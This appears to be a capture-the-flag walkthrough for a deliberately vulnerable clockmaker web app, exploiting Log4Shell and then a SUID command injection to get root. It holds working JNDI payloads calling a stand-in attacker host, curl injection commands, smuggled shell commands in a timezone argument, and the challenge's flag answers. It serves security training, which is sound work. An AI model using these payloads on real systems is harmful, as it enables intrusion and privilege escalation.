# Horloger Suisse - CTF Exploitation Guide

## Challenge Overview

This challenge simulates a Swiss clockmaker boutique vulnerable to Log4Shell (CVE-2021-44228) leading to privilege escalation.
Run with : docker run -d --network host --name horloger-host horloge
## Phase 1: Web Exploitation (Log4j RCE)

### Vulnerable Entry Points

1. **Contact Form** (`POST /contact`)
   - Parameters: `name`, `email`, `message`
   - Headers: `User-Agent`, `X-Client-Info`

2. **Search Functionality** (`GET /search?q=`)
   - Parameter: `q` (search query)

3. **Timepiece Viewing** (`GET /timepiece/{id}`)
   - Path parameter: `id`

### Sample Log4j Payloads

```bash
# Basic LDAP callback test
${jndi:ldap://attacker.com:1389/exploit}

# DNS exfiltration 
${jndi:dns://logs.attacker.com/}

# HTTP callback
${jndi:ldap://attacker.com:1389/Basic/Command/Base64/Y3VybCBodHRwOi8vYXR0YWNrZXIuY29tL2NhbGxiYWNr}
```

### Exploitation Examples

#### 1. Via Contact Form
```bash
curl -X POST http://target:8080/contact \
  -d "name=Test&email=test@test.com&message=\${jndi:ldap://attacker.com:1389/exploit}" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

#### 2. Via Search Parameter
```bash
curl "http://target:8080/search?q=\${jndi:ldap://attacker.com:1389/exploit}"
```

#### 3. Via User-Agent Header
```bash
curl -X POST http://target:8080/contact \
  -d "name=Test&email=test@test.com&message=Hello" \
  -H "User-Agent: \${jndi:ldap://attacker.com:1389/exploit}" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

#### 4. Via Custom Header
```bash
curl -X POST http://target:8080/contact \
  -d "name=Test&email=test@test.com&message=Hello" \
  -H "X-Client-Info: \${jndi:ldap://attacker.com:1389/exploit}" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

## Phase 1.5: Getting User Flag

After gaining RCE as `www-data`:

1. **Find the user flag**:
   ```bash
   # Flag is in /var/www/user.txt, readable by www-data
   cat /var/www/user.txt
   
   # Or discover it by exploring the web directory
   ls -la /var/www/
   ```

## Phase 2: Privilege Escalation

### Discovery
After gaining shell access as `www-data`, look for:

1. **System notes with hints**:
   ```bash
   cat /opt/horloger/system_notes.txt
   ```

2. **Cron jobs mentioning timedatectl**:
   ```bash
   cat /etc/cron.d/horloger
   ```

3. **SUID binaries**:
   ```bash
   find / -perm -4000 2>/dev/null | grep timedatectl
   ```

### Exploitation

The custom `timedatectl` binary has a command injection vulnerability in the `set-timezone` function:

```bash
# Exploit the command injection
/usr/local/bin/timedatectl set-timezone "Europe/Zurich; id; #"

# Get a root shell
/usr/local/bin/timedatectl set-timezone "Europe/Zurich; bash; #"

# Read the root flag
/usr/local/bin/timedatectl set-timezone "Europe/Zurich; cat /root/root.txt; #"
```

## Flags

- **User flag**: `/var/www/user.txt` - `flag-l0g4j_t1m3_1s_pr3c10us_sw1ss_h0rl0g3r`
- **Root flag**: `/root/root.txt` - `flag-t1m3_1s_r00t_sw1ss_m4st3r_h0rl0g3r_rul3s_th3_t1m3`